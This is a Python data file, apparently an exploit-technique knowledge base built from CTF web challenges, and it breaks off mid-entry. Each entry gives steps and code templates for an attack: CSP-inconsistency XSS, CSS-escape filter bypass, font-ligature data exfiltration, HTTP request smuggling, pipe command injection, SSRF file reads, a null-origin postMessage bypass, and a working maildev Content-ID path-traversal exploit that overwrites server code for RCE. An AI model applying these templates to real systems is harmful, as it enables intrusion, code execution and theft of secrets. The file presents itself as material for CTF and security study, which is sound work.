        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSP split-brain — unsafe-inline on admin routes enables XSS execution",
            "applies_when": (
                "The web app applies different CSP policies per route, and admin routes have "
                "script-src 'unsafe-inline'. XSS is blocked on public pages via nonce-based CSP, "
                "but becomes executable when redirected to admin pages."
            ),
            "prerequisites": [
                "Admin route: script-src 'self' 'unsafe-inline'",
                "Public route: script-src 'nonce-...'",
                "Admin page has a sink that reflects user input (innerHTML, etc.)",
                "A way to direct users to the admin page (form submit, redirect, etc.)",
            ],
            "technique_steps_md": (
                "1. Analyze CSP headers: `req.path.startsWith('/admin')` → unsafe-inline\n"
                "2. Confirm XSS payload is blocked by CSP on public pages\n"
                "3. Find a sink on admin pages that accepts user input (innerHTML, eval, etc.)\n"
                "4. Insert form/redirect to admin page in stored content on public pages\n"
                "5. When victim (bot) visits admin page, XSS executes under unsafe-inline CSP"
            ),
            "code_template": (
                "// Express middleware CSP config (vulnerable pattern)\n"
                "if (req.path.startsWith('/admin')) {\n"
                "  res.setHeader('CSP', \"script-src 'self' 'unsafe-inline'\");\n"
                "} else {\n"
                "  res.setHeader('CSP', `script-src 'nonce-${nonce}'`);\n"
                "}\n"
                "// innerHTML = userInput on admin page → XSS possible"
            ),
            "examples": [
                {
                    "params": {
                        "admin_csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'",
                        "public_csp": "default-src 'self'; script-src 'nonce-{random}'; base-uri 'none'",
                        "admin_sink": "/admin/page → atob(params) → fetch /admin/sanitize → innerHTML",
                    },
                },
            ],
            "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        },
    },
    {
        "name": "ejs_theme_path_traversal_css_injection",
        "vuln_type": "path_traversal",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EJS theme path traversal — CSS file include via ../ in theme parameter",
            "applies_when": (
                "In EJS (or similar template engine), a user-controllable theme value is "
                "directly inserted into the CSS path. "
                "In a pattern like `<link href=\"/css/theme/<%= theme %>.css\">`, "
                "setting `theme: \"../switch\"` loads a different CSS file."
            ),
            "prerequisites": [
                "Theme parameter is stored in DB or directly reflected from URL",
                "Inserted into CSS path without server-side validation",
                "An alternative CSS file exists that can be loaded (within static directory)",
            ],
            "technique_steps_md": (
                "1. Enter `../switch` in the theme field when creating a post (no server validation)\n"
                "2. On render: `<link href=\"/css/theme/../switch.css\">` → loads `/css/switch.css`\n"
                "3. switch.css provides absolute positioning via `.slider` class\n"
                "4. Insert a submit button with `.slider` class into post content\n"
                "5. Overlay on top of existing UI elements (#delete, etc.) → click hijacking"
            ),
            "code_template": (
                "requests.post('{url}/post/write', json={\n"
                "    'title': 'test',\n"
                "    'content': '<form action=\"/admin/test\">'\n"
                "              '<button type=\"submit\" class=\"slider\"></button>'\n"
                "              '</form>',\n"
                "    'theme': '../switch'\n"
                "}, cookies={'jwt': token})"
            ),
            "examples": [
                {
                    "params": {
                        "template": '<link rel="stylesheet" href="/css/theme/<%= post.theme %>.css">',
                        "payload_theme": "../switch",
                        "loaded_css": "/css/switch.css",
                        "css_effect": ".slider { position: absolute; width/height: 100% }",
                    },
                },
            ],
            "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress", "clickjacking"],
        },
    },
    {
        "name": "headless_bot_click_hijack_css_overlay",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Headless bot click hijacking via CSS absolute position overlay",
            "applies_when": (
                "A CTF or web app has a headless browser bot (Puppeteer, etc.) that visits a page "
                "and clicks a specific element (#delete, etc.). User-controllable HTML/CSS can overlay "
                "another element on top of the click target, hijacking the bot's click to perform "
                "a different action (form submit, etc.)."
            ),
            "prerequisites": [
                "Headless browser bot visits a page and clicks a specific element",
                "User can insert form/button into HTML content",
                "CSS absolute/fixed positioning is available (theme traversal, inline style, etc.)",
                "Bot visits with an authenticated session (cookie)",
            ],
            "technique_steps_md": (
                "1. Analyze bot behavior: `page.$('#delete').click()` etc.\n"
                "2. Insert `<form action=\"/target\">` + `<button class=\"slider\">` into user content\n"
                "3. CSS (.slider) covers entire area with position: absolute + width/height: 100%\n"
                "4. Bot attempts to click #delete → actually clicks .slider submit button\n"
                "5. Form sends GET request to /target with authenticated session → delivers attacker payload"
            ),
            "code_template": (
                "<!-- Post content with clickjack overlay -->\n"
                "<form action=\"http://target/admin/test\">\n"
                "    <input type=\"hidden\" name=\"title\" value=\"{b64_title}\">\n"
                "    <input type=\"hidden\" name=\"content\" value=\"{b64_xss_payload}\">\n"
                "    <button type=\"submit\" class=\"slider\"></button>\n"
                "</form>\n"
                "<!-- theme: ../switch loads CSS with .slider { position: absolute } -->"
            ),
            "examples": [
                {
                    "params": {
                        "bot_action": "page.$('#delete').click()",
                        "overlay_css": ".slider { position: absolute; cursor: pointer; width: 100%; height: 100% }",
                        "redirect_target": "/admin/page?title=...&content=<b64_xss>",
                        "bot_cookie": "JWT with sensitive data in claims",
                    },
                },
            ],
            "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        },
    },
    # ── CSS side-channel techniques ──────────────────────────────
    {
        "name": "css_import_escape_url_filter_bypass",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "import", "escape", "filter-bypass", "style-injection", "exfiltration"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS @import remote URL filter bypass via CSS escape sequences",
            "applies_when": (
                "Client-side JS detects and blocks remote URLs (http://, //) inside <style> blocks, "
                "but CSS escape sequences (\\3a = ':', \\2f = '/') bypass the JS regex while the "
                "browser correctly parses and loads the external resource URL."
            ),
            "prerequisites": [
                "<style> tag injection possible (e.g. in posts)",
                "Client-side JS filters remote URLs in CSS via regex",
                "Server-side allows <style> tags (not removed by DOMPurify or handled separately)",
            ],
            "technique_steps_md": (
                "1. Analyze JS filter: `/\\b(?:https?|data)\\s*:/i.test(css)` or `css.includes('//')`\n"
                "2. Bypass via CSS escape: `http\\3a \\2f \\2f attacker\\2f style.css`\n"
                "3. Load external CSS with `@import` rule: `<style>@import 'http\\3a \\2f \\2f ...';</style>`\n"
                "4. Browser decodes escapes and requests the URL normally"
            ),
            "code_template": (
                "def css_escape_url(url):\n"
                "    return (url.replace(':', '\\\\3a ')\n"
                "               .replace('/', '\\\\2f ')\n"
                "               .replace('?', '\\\\3f ')\n"
                "               .replace('=', '\\\\3d ')\n"
                "               .replace('&', '\\\\26 '))\n"
                "\n"
                "payload = f\"<style>@import '{css_escape_url(collector_url)}';</style>\""
            ),
            "examples": [{
                "params": {
                    "filter_regex": "/\\b(?:https?|data)\\s*:/i.test(css) || css.includes('//')",
                    "bypass": "http\\3a \\2f \\2f attacker:18800\\2f style.css",
                    "max_payload_len": 320,
                },
            }],
            "tags": ["css", "import", "escape", "filter-bypass", "style-injection"],
        },
    },
    {
        "name": "firefox_content_visibility_hidden_layout_bug",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug", "defense-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Firefox content-visibility:hidden bug — checkVisibility()=false but layout still works",
            "applies_when": (
                "The web app implements a defense using JavaScript `element.checkVisibility()` to "
                "detect and remove CSS-displayed elements. "
                "A Firefox ESR 140.0 bug causes `content-visibility:hidden` to make "
                "`checkVisibility()` return false (bypassing the defense), while "
                "internal flex/grid layout, font loading, container queries, and background-image "
                "loading still work normally, enabling CSS-only attacks."
            ),
            "prerequisites": [
                "Firefox ESR 140.0 (or version with this bug)",
                "JS defense relies on checkVisibility()",
                "Attacker can set content-visibility:hidden via CSS injection",
                "Side-channel via internal layout or resource loading required",
            ],
            "technique_steps_md": (
                "1. Analyze JS defense: `f.checkVisibility()` → if true, `f.remove()`\n"
                "2. CSS injection: `#page { content-visibility: hidden !important; }`\n"
                "3. `checkVisibility()` → returns false (defense bypassed)\n"
                "4. Firefox bug: internal layout still works\n"
                "5. Execute side-channel via flex layout + font ligature + container query\n"
                "6. Ref: https://bugzilla.mozilla.org/show_bug.cgi?id=2025174"
            ),
            "code_template": (
                "#page {\n"
                "  content-visibility: hidden !important;\n"
                "  display: flex !important;\n"
                "  /* internal layout still works due to Firefox bug */\n"
                "}\n"
                "#flag {\n"
                "  display: block !important;\n"
                "  /* checkVisibility()=false so JS does not remove it */\n"
                "}"
            ),
            "examples": [{
                "params": {
                    "browser": "Firefox ESR 140.0 (headless)",
                    "bug_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2025174",
                    "defense": "setInterval(check, 50) + MutationObserver — checkVisibility() based",
                    "bypassed_checks": ["display !== none", "checkVisibility() === true"],
                },
            }],
            "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug"],
        },
    },
    {
        "name": "css_font_ligature_width_side_channel",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS font ligature width side-channel — character-by-character data exfiltration",
            "applies_when": (
                "Secret text exists in the DOM and the attacker can inject CSS to apply a "
                "custom font to that element. Text content can be exfiltrated one character at a "
                "time using CSS only, without JavaScript execution."
            ),
            "prerequisites": [
                "Secret text exists in a DOM element (e.g. flag div)",
                "CSS injection possible (style tag or @import)",
                "Browser supports external font loading + container queries",
                "External collector server needed (serves fonts/CSS + collects hits)",
            ],
            "technique_steps_md": (
                "1. **Build custom font**: use fonttools to build a ligature font\n"
                "   - Known prefix + each candidate character → mapped to glyphs with different widths\n"
                "   - e.g.: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...\n"
                "2. **CSS layout setup**: flex container + container query\n"
                "   - `#page` = flex row, fixed width\n"
                "   - `#flag` = flex: 0 0 auto (takes up text width)\n"
                "   - `.spacer` = flex: 1 1 auto + container-type: size (remaining space)\n"
                "3. **Container Query oracle**: different background-image URL based on spacer width\n"
                "   - `@container (width: Npx) { .spacer::before { background-image: url(.../hit?c=X); } }`\n"
                "4. **Exfiltrate one character**: browser loads only the matching URL → character sent to collector\n"
                "5. **Repeat**: update prefix → generate new font/CSS → exfiltrate next character"
            ),
            "code_template": (
                "# Font generation (fonttools)\n"
                "fb = FontBuilder(1000, isTTF=True)\n"
                "# generate ligature glyph with different width for each candidate character\n"
                "for i, ch in enumerate(candidates):\n"
                "    metrics[lig_name(i)] = (i + 1, 0)  # width = index+1\n"
                "# OpenType feature: sub prefix_glyphs candidate_glyph by lig_glyph\n"
                "fea = 'sub ' + ' '.join(glyph_name(c) for c in prefix) + ' ' + glyph_name(ch) + ' by ' + lig_name(i)\n"
                "\n"
                "# CSS: @font-face + flex layout + container query\n"
                "# @container (width: Npx) { background-image: url(collector/hit?c=X); }"
            ),
            "examples": [{
                "params": {
                    "flag_element": '<div id="flag">{{ flag }}</div>',
                    "font_lib": "fonttools (Python)",
                    "exfil_method": "container query → background-image URL per character",
                    "chars_per_iteration": 1,
                    "total_iterations": "flag_length - prefix_length",
                    "success_rate": "~80% per attempt, 5 retries",
                },
                "notes": (
                    "Combined with the Firefox ESR content-visibility:hidden bug. "
                    "Bypasses JS defense (checkVisibility) while executing font ligature side-channel. "
                    "5 consecutive characters exfiltrated successfully in local testing."
                ),
            }],
            "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query", "fonttools"],
        },
    },
    # ── HTTP smuggling / protocol confusion techniques ──────────
    {
        "name": "safe_strlen_content_length_desync",
        "vuln_type": "http_request_smuggling",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["smuggling", "content-length", "desync", "php", "control-char"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_strlen Content-Length desync — HTTP request smuggling via control character truncation",
            "applies_when": (
                "A PHP app computes Content-Length using a safe_strlen-style function that returns "
                "immediately on ctype_cntrl($c). When the actual body length differs from safe_strlen's "
                "result, a second request can be smuggled to the backend."
            ),
            "prerequisites": [
                "PHP safe_strlen: for-loop + ctype_cntrl → return $len (early termination on control char)",
                "PHP forwards requests to backend via curl — keep-alive connection",
                "Backend (Node.js, etc.) reads body based on actual Content-Length, leaving remaining bytes as next request",
            ],
            "technique_steps_md": (
                "1. Analyze `safe_strlen` — check if it truncates length at first control char (\\x00-\\x1f)\n"
                "2. Construct actual body: `VISIBLE_PART + \\r + SMUGGLED_HTTP_REQUEST`\n"
                "   → safe_strlen returns `len(VISIBLE_PART)`, but actual transmission is the full length\n"
                "3. PHP sends POST to backend with `Content-Length: safe_strlen(body)` (keep-alive)\n"
                "4. Backend reads only VISIBLE_PART as the first request body,\n"
                "   remaining `\\r + SMUGGLED_HTTP_REQUEST` is parsed as a new request\n"
                "5. Insert desired endpoint/header/body into smuggled request for arbitrary actions"
            ),
            "code_template": (
                "visible = b'action=healthcheck'\n"
                "smuggled = (\n"
                "    b'\\r\\n'\n"
                "    b'POST /set/{key}/{value} HTTP/1.1\\r\\n'\n"
                "    b'X-Auth: {auth_header}\\r\\n'\n"
                "    b'Content-Length: 0\\r\\n'\n"
                "    b'\\r\\n'\n"
                ")\n"
                "body = visible + b'\\r' + smuggled  # \\r triggers safe_strlen cutoff\n"
                "# PHP sees Content-Length: len(visible), backend gets both requests"
            ),
            "examples": [{
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d) or any ctype_cntrl char",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value",
                },
                "notes": (
                    "Solvable without smuggling if there's no input sanitization, "
                    "but CL desync is required when danger()-style filters are present."
                ),
            }, {
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d)",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value — input filter bypass",
                },
                "notes": (
                    "danger()-style function filters pipe(|)/null/newline, so "
                    "direct command injection in URL is not possible → bypass via CL desync."
                ),
            }],
            "tags": ["smuggling", "content-length", "desync", "php", "safe_strlen", "control-char", "keep-alive"],
        },
    },
    {
        "name": "memstorage_pipe_newline_command_injection",
        "vuln_type": "command_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol", "injection", "pipe", "newline", "tcp", "memstorage"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Memstorage pipe/newline command injection — multi-command execution via delimiter in user input",
            "applies_when": (
                "A TCP-based custom protocol server's parseCommand splits input on `|` or `\\n`, "
                "and user input from an HTTP endpoint is included directly in the protocol stream. "
                "Injecting `|CMD arg` into key/value parameters executes arbitrary protocol commands."
            ),
            "prerequisites": [
                "TCP custom protocol: parseCommand splits commands via input.split(/\\n|\\|/)",
                "HTTP→TCP bridge: Express etc. passes URL params to memstorage protocol",
                "No pipe/newline sanitization on user input (or bypassable)",
            ],
            "technique_steps_md": (
                "1. Analyze memstorage.js parseCommand — identify split delimiter (`/\\n|\\|/`)\n"
                "2. Identify useful commands from VALID_CMDS list (AUTH, AUTH_S, GET, SET, BYE, etc.)\n"
                "3. Inject pipe into key via HTTP endpoint (e.g. `/get/:key`):\n"
                "   `GET /get/test|AUTH_S <hex_creds> <hex_payload>|BYE`\n"
                "4. Express sends `GET test|AUTH_S ... |BYE` to memstorage TCP\n"
                "5. parseCommand splits on pipe → 3 commands (GET, AUTH_S, BYE) executed sequentially\n"
                "6. If AUTH_S result includes Visit=> pattern in response, SSRF chain triggers"
            ),
            "code_template": (
                "import urllib.parse\n"
                "# hex-encode the Visit=>file:///flag.txt payload\n"
                "visit_hex = 'file:///flag.txt'.encode().hex()\n"
                "crlf_hex = '0d0a0d0a'  # \\r\\n\\r\\n in hex\n"
                "injected_key = f'test|AUTH_S {crlf_hex} {visit_hex}|BYE'\n"
                "url = f'http://target/get/{urllib.parse.quote(injected_key, safe=\"\")}'"
            ),
            "examples": [{
                "params": {
                    "delimiter": "pipe (|)",
                    "injected_via": "/get/:key URL parameter",
                    "auth_cmd": "AUTH_S <hex_id> <hex_pw_or_payload>",
                },
                "notes": (
                    "Direct pipe injection possible if no input filter is present. "
                    "AUTH_S hex-decoded result contains the Visit=> payload."
                ),
            }],
            "tags": ["command-injection", "pipe", "newline", "protocol", "memstorage", "tcp", "parseCommand"],
        },
    },
    {
        "name": "visit_redirect_ssrf_chain",
        "vuln_type": "ssrf",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "redirect", "visit", "file-read", "chain"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Visit=> response-driven SSRF chain — secondary request via response body pattern",
            "applies_when": (
                "A debug_Get/api_Get-style function searches the first HTTP response body for the "
                "'Visit=>URL' pattern, extracts the URL, and sends a second request (api_Get). "
                "Injecting Visit=>file:///flag.txt into the first response achieves LFI."
            ),
            "prerequisites": [
                "PHP debug_Get: strpos('Visit=>') on response → explode → api_Get(next_url)",
                "api_Get uses curl, supporting file:// scheme",
                "Injection point available to insert Visit=>payload into first response body",
            ],
            "technique_steps_md": (
                "1. Analyze debug_Get function:\n"
                "   ```php\n"
                "   function debug_Get($url) {\n"
                "       $response = file_get_contents($url);\n"
                "       if(strpos($response, 'Visit=>') !== FALSE) {\n"
                "           $next_url = explode('Visit=>', $response)[1];\n"
                "           return api_Get($next_url);\n"
                "       }\n"
                "       return $response;\n"
                "   }\n"
                "   ```\n"
                "2. api_Get is curl-based — confirm file:// scheme support\n"
                "3. Insert `Visit=>file:///flag.txt` string into the first request's response\n"
                "   (e.g. hex-decoded payload included in memstorage AUTH_S error message)\n"
                "4. debug_Get extracts `file:///flag.txt` → api_Get(file:///flag.txt) → returns flag"
            ),
            "code_template": (
                "# Craft a URL that will make the server return Visit=>file:///flag.txt\n"
                "visit_payload = 'Visit=>file:///flag.txt'\n"
                "# Inject via memstorage AUTH_S hex encoding:\n"
                "visit_hex = visit_payload.encode().hex()\n"
                "# AUTH_S will echo hex-decoded content in error response\n"
                "debug_url = f'http://api:9090/get/test|AUTH_S 0d0a0d0a {visit_hex}|BYE'\n"
                "# Call debug action:\n"
                "requests.get(f'{base}/memstorage.php', params={'action':'debug','url':debug_url})"
            ),
            "examples": [{
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "AUTH_S hex-decoded error response contains Visit=>file:///flag.txt, "
                    "causing debug_Get to read file:///flag.txt via curl and return the flag."
                ),
            }, {
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "Visit=> response can be verified from memstorage via fsockopen, "
                    "but PHP 8.2+ file_get_contents HTTP parser may reject raw TCP responses."
                ),
            }],
            "tags": ["ssrf", "visit", "redirect", "file-read", "lfi", "curl", "chain", "debug_Get"],
        },
    },
    {
        "name": "http_to_tcp_protocol_confusion",
        "vuln_type": "protocol_confusion",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol-confusion", "http", "tcp", "ssrf", "file_get_contents"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "HTTP-to-TCP protocol confusion — file_get_contents(http://) to raw TCP service",
            "applies_when": (
                "When PHP's file_get_contents('http://host:port/path') connects to a raw TCP service "
                "(non-HTTP), the HTTP request line and headers are interpreted as commands by the TCP "
                "protocol. GET /path HTTP/1.0 itself becomes input to the custom protocol."
            ),
            "prerequisites": [
                "PHP file_get_contents + http:// stream wrapper in use",
                "Target is a raw TCP service (e.g. memstorage on port 9091)",
                "TCP service's parseCommand (partially) processes the HTTP request line",
                "Strictness of parsing raw TCP response as HTTP varies by PHP version",
            ],
            "technique_steps_md": (
                "1. Induce debug action to request `http://api:9091/` URL via file_get_contents\n"
                "2. Actual data PHP sends:\n"
                "   ```\n"
                "   GET /CMD1|CMD2|CMD3 HTTP/1.0\\r\\n\n"
                "   Host: api:9091\\r\\n\n"
                "   \\r\\n\n"
                "   ```\n"
                "3. memstorage parseCommand splits `GET /CMD1|CMD2|CMD3`:\n"
                "   - `GET /CMD1` (invalid → skip)\n"
                "   - `CMD2` (valid command executed)\n"
                "   - `CMD3` (valid command executed)\n"
                "4. However, PHP's HTTP stream wrapper expects the first line of the response to be an "
                "HTTP status line — raw TCP responses usually fail. May be bypassable with ignore_errors "
                "depending on PHP version.\n"
                "5. Bypass strategy: use fsockopen for direct TCP communication from PHP, or "
                "trick memstorage response into starting with an HTTP/1.x-like first line."
            ),
            "code_template": (
                "# Pass raw TCP service URL to PHP debug action\n"
                "import urllib.parse\n"
                "cmd_payload = 'AUTH_S 0d0a0d0a ' + 'file:///flag.txt'.encode().hex() + '|BYE'\n"
                "debug_url = f'http://api:9091/{urllib.parse.quote(cmd_payload, safe=\"\")}'\n"
                "# memstorage.php?action=debug&url=<debug_url>\n"
                "# PHP sends: GET /<cmd_payload> HTTP/1.0\\r\\nHost: api:9091\\r\\n\\r\\n\n"
                "# memstorage splits on | and executes AUTH_S and BYE"
            ),
            "examples": [{
                "params": {
                    "php_function": "file_get_contents with http:// wrapper",
                    "target_service": "custom TCP service on non-HTTP port",
                    "http_request_as_command": "GET /payload HTTP/1.0 → parseCommand splits on |",
                },
                "notes": (
                    "In PHP 8.2+, file_get_contents may fail when trying to parse raw TCP "
                    "responses as HTTP headers. Direct TCP via fsockopen succeeds. "
                    "file_get_contents may also work depending on PHP version."
                ),
            }],
            "tags": ["protocol-confusion", "http-to-tcp", "file_get_contents", "ssrf", "memstorage", "raw-tcp"],
        },
    },

    # ── 22. SMTP Content-ID path traversal → arbitrary file write → RCE ────
    {
        "name": "smtp_content_id_path_traversal_rce",
        "vuln_type": "path_traversal",
        "attack_metadata": {
            "name": "SMTP Content-ID path traversal → arbitrary file write → RCE",
            "applies_when": (
                "A mail server (e.g. maildev) uses the Content-ID header value directly as the "
                "filename when saving attachments, with no path sanitization. "
                "Inserting `../` sequences in the attachment's Content-ID can overwrite server source "
                "code files, and the overwritten code executes on server restart, achieving RCE."
            ),
            "prerequisites": [
                "Mail can be sent to the SMTP port (default 1025) without authentication",
                "Mail server passes Content-ID directly to fs.createWriteStream when saving attachments",
                "Server source code file path is known or guessable (e.g. /home/node/lib/routes.js)",
                "Server restarts periodically or a restart can be triggered",
            ],
            "technique_steps_md": (
                "1. Analyze the mail server's attachment save logic — check `saveAttachment(id, attachment)`\n"
                "2. Vulnerable if pattern is `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))`\n"
                "3. Calculate relative path from attachment save directory (`/tmp/maildev-<pid>/<id>/`) to target file:\n"
                "   - e.g.: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`\n"
                "4. Send email with malicious code in attachment, Content-ID header containing path traversal:\n"
                "   ```python\n"
                "   attachment.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
                "   ```\n"
                "5. Malicious routes.js content: read flag file + expose via HTTP endpoint\n"
                "6. Wait for (or trigger) server restart → overwritten code is loaded → access /flag to get the flag"
            ),
            "code_template": (
                "import smtplib\n"
                "from email.mime.multipart import MIMEMultipart\n"
                "from email.mime.text import MIMEText\n"
                "from email.mime.base import MIMEBase\n\n"
                "MALICIOUS_JS = '''\n"
                "const express = require('express'); const fs = require('fs');\n"
                "module.exports = function(app, ms, bp) {\n"
                "  const r = express.Router();\n"
                "  r.get('/flag', (req,res) => res.send(fs.readFileSync('/flag','utf8')));\n"
                "  app.use(bp, r);\n"
                "};\n"
                "'''\n\n"
                "msg = MIMEMultipart('related')\n"
                "msg['From'] = 'a@evil.com'; msg['To'] = 'v@target.local'\n"
                "msg['Subject'] = 'x'\n"
                "msg.attach(MIMEText('<html><body>x</body></html>', 'html'))\n"
                "att = MIMEBase('application', 'javascript')\n"
                "att.set_payload(MALICIOUS_JS.encode())\n"
                "att.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
                "att.add_header('Content-Disposition', 'inline', filename='routes.js')\n"
                "msg.attach(att)\n"
                "with smtplib.SMTP('{host}', {smtp_port}) as s:\n"
                "    s.sendmail('a@evil.com', ['v@target.local'], msg.as_string())"
            ),
            "examples": [{
                "params": {
                    "host": "localhost",
                    "smtp_port": 1025,
                    "web_port": 1080,
                    "target_file": "/home/node/lib/routes.js",
                    "content_id_payload": "../../../home/node/lib/routes.js",
                    "flag_path": "/flag",
                },
                "notes": (
                    "maildev 2.0.x saveAttachment passes Content-ID directly to path.join. "
                    "After server restart, overwritten routes.js is require'd, achieving RCE. "
                    "Registered as CVE-2024-27448."
                ),
            }],
            "tags": ["smtp", "content-id", "path-traversal", "arbitrary-file-write", "rce", "maildev", "node"],
        },
    },

    # ── 23. Express req property traversal via search/getdata ───
    {
        "name": "express_req_property_traversal_leak",
        "vuln_type": "information_disclosure",
        "attack_metadata": {
            "name": "Express req object property traversal — cookie/header leak",
            "applies_when": (
                "The server passes user input (key) along with the Express req object to a "
                "getdata/resolve-style function. In a getdata(key, value, req) pattern, "
                "key = 'cookies.sessionId' etc. can access internal properties like "
                "req.cookies, req.headers, req.query."
            ),
            "prerequisites": [
                "Server handler passes req object directly to a generic data resolver",
                "Key is split by dot (.) or delimiter for recursive access",
                "Blocklist for prototype/constructor does not include cookies, headers, etc.",
            ],
            "technique_steps_md": (
                "1. Analyze data resolver at /search endpoint — check if 3rd argument is `req`\n"
                "2. Use dot-path in key for `getdata(key, value, data)`: `cookies.key`\n"
                "3. If `value='*'`, enumerate all sub-properties; specific value returns that key only\n"
                "4. When request includes cookies → leaked in response as `<p id=key>cookie_value</p>`\n"
                "5. Other req properties (headers, query, body, etc.) are accessible the same way"
            ),
            "code_template": (
                "import requests\n"
                "# Leak all cookies\n"
                "resp = requests.post('{url}/search',\n"
                "    json={'query': {'cookies': '*'}},\n"
                "    cookies={'key': 'secret_value'})\n"
                "# Response: <p id=key>secret_value</p>\n\n"
                "# Leak specific cookie char by char\n"
                "resp = requests.post('{url}/search',\n"
                "    json={'query': {'cookies.key': '*'}},\n"
                "    cookies={'key': 'secret'})\n"
                "# Response: <p id=0>s</p><p id=1>e</p>..."
            ),
            "examples": [{
                "params": {
                    "endpoint": "/search",
                    "data_arg": "req (Express request object)",
                    "leaked_property": "req.cookies.key",
                    "key_payload": "cookies or cookies.key",
                },
                "notes": (
                    "Blocklist only contains __proto__, prototype, constructor — "
                    "cookies, headers, query, etc. are not blocked. "
                    "value='*' returns all properties; specifying a key returns that value only."
                ),
            }],
            "tags": ["express", "req-traversal", "cookie-leak", "information-disclosure", "property-access"],
        },
    },

    # ── 24. isSameSite null origin bypass ────────────────────────
    {
        "name": "isamesite_null_origin_bypass",
        "vuln_type": "access_control_bypass",
        "attack_metadata": {
            "name": "postMessage isSameSite check bypass via null origin",
            "applies_when": (
                "Client-side JS checks isSameSite(window.origin, e.origin) on postMessage receipt, "
                "and the isSameSite implementation uses origin.slice(7).split('.').slice(-2).join('.').endsWith(...). "
                "When e.origin='null' from data: URL, sandbox iframe, or blob: URL, "
                "'null'.slice(7)='' → endsWith('')=true, always passing."
            ),
            "prerequisites": [
                "Target page performs origin check in postMessage event listener",
                "isSameSite uses slice(7) + endsWith pattern",
                "Attacker can send postMessage from data: URL or sandboxed iframe",
            ],
            "technique_steps_md": (
                "1. Analyze target page's message event listener — check isSameSite logic\n"
                "2. `origin.slice(7)` → intended to strip 'http://', but returns empty string for 'null'\n"
                "3. `''.split('.').slice(-2).join('.')` = `''`\n"
                "4. `anything.endsWith('')` = `true` — always passes\n"
                "5. Load data: URL in sandbox iframe + allow-same-origin on attacker page\n"
                "6. Inside data: URL, open target with window.open and send postMessage to iframe\n"
                "7. Establish bidirectional communication via MessageChannel port transfer"
            ),
            "code_template": (
                "<!-- Attacker page -->\n"
                "<iframe sandbox='allow-scripts allow-same-origin allow-popups'\n"
                "  id='exploit'></iframe>\n"
                "<script>\n"
                "exploit.src = `data:text/html,<script>\n"
                "  var w = window.open('{target_url}');\n"
                "  setTimeout(() => {\n"
                "    var mc = new MessageChannel();\n"
                "    mc.port1.onmessage = (e) => { /* handle response */ };\n"
                "    w[0].postMessage(1, '*', [mc.port2]);\n"
                "  }, 1000);\n"
                "<\\/script>`;\n"
                "</script>"
            ),
            "examples": [{
                "params": {
                    "target_url": "http://frontend:8080/",
                    "attacker_origin": "null (data: URL in sandbox iframe)",
                    "bypass_reason": "'null'.slice(7)='' → endsWith('')=true",
                },
                "notes": (
                    "allow-same-origin required on sandbox iframe. "
                    "After bidirectional communication via MessageChannel, window properties can be set (debug mode, etc.)."
                ),
            }],
            "tags": ["postmessage", "origin-bypass", "null-origin", "sandbox", "isamesite", "messagechannel"],
        },
    },

    # ── 25. BREACH gzip compression side-channel ────────────────
    {
        "name": "breach_gzip_compression_side_channel",
        "vuln_type": "information_disclosure",
        "attack_metadata": {
            "name": "BREACH gzip compression side-channel for secret extraction",
            "applies_when": (
                "Server response is gzip compressed, and the same response contains both "
                "(1) a secret value (cookie, etc.) and (2) attacker-controlled text. "
                "When the guessed characters match the secret's prefix, gzip compresses more "
                "efficiently → smaller Content-Length → character-by-character brute-force possible."
            ),
            "prerequisites": [
                "Response has gzip/deflate compression (flask-compress, nginx gzip, etc.)",
                "Secret (cookie value, etc.) is reflected in the response",
                "Attacker can insert arbitrary text into the same response",
                "Oracle exists to observe Content-Length (debug mode, timing, etc.)",
            ],
            "technique_steps_md": (
